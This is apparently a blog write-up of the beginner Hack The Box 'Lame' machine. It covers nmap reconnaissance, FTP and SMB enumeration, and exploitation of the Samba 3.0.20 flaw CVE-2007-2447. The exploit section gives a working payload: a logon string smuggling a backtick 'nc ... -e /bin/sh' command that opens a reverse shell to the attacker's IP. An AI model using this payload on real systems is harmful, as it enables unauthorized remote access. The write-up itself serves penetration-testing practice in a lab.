---
layout: post
title: Lame
date: 2024-07-17 10:00:00 -0400
---

Lame box is an easy challenge suitable for beginners. It involves discovering open ports like FTP and SMB using Nmap. A vulnerability in Samba 3.0.20-Debian allows for remote command execution, making it a straightforward introduction to penetration testing.
# Recon

## nmap

Discovered some open ports.
![[Lame_image_1.png]]
Scan ports 21 (FTP), 22 (SSH), 139 (NetBIOS), 445 (SMB), and 3632, perform version detection and default script scanning.
![[Lame_image_2.png]]
## FTP - TCP 21
Anonymous login but empty.
![[Pasted image 20240623021419.png]]
## SMB - TCP 445
One accessible share.
![[Lame_image_3.png]]
Nothing Important
![[Pasted image 20240623021705.png]]

# Exploit
Samba 3.0.20-Debian is vulnerable to RCE.
CVE: https://nvd.nist.gov/vuln/detail/CVE-2007-2447

Connect to the smb share:
```
smbclient //10.129.101.202/tmp
```
Enter command to pop a shell:
```
logon "/=`nc 10.10.14.151 1337 -e /bin/sh`"
```

Root
![[tmp1719122533136_Lame_image_1.png]]
